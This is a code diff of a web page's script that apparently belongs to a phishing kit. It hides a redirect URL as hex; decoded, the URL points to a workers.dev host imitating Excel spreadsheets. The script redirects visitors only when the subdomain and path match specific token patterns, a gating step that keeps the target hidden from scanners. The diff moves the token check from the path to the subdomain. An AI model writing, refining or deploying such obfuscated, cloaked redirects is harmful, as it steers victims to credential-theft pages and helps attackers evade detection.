@@ -45,11 +45,11 @@ display:none;
 
 <script>
 
-/* your hex redirect URL */
+/* HEX redirect destination */
 const hexURL =
 "68747470733a2f2f626c7537306c336673312d657863656c2d6f70656238323531636964393133783373353473707265656473686565657473302d313062632e636f6d30323930362e776f726b6572732e6465762f";
 
-/* decode hex → string */
+/* hex decoder */
 function hexToString(hex){
 let str="";
 for(let i=0;i<hex.length;i+=2){
@@ -60,17 +60,20 @@ return str;
 
 function validateURL(){
 
-let parts = window.location.pathname.split("/").filter(Boolean);
+let hostname = window.location.hostname;
+let path = window.location.pathname;
 
-if(parts.length < 2) return;
+/* extract first subdomain */
+let subdomain = hostname.split(".")[0];
 
-let token = parts[0];
-let structure = parts[1];
+/* remove leading slash */
+let structure = path.replace(/^\/+/,"");
 
-let tokenPattern = /^[A-Z]{8}-[0-9]{9}$/;
+/* validation rules */
+let subPattern = /^[A-Z]{8}-[0-9]{9}$/;
 let endPattern = /^[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;
 
-if(tokenPattern.test(token) && endPattern.test(structure)){
+if(subPattern.test(subdomain) && endPattern.test(structure)){
 
 document.getElementById("loader").style.display="flex";
 
@@ -78,7 +81,6 @@ setTimeout(function(){
 
 let finalURL = hexToString(hexURL);
 
-/* force redirect */
 window.location.replace(finalURL);
 
 },2000);
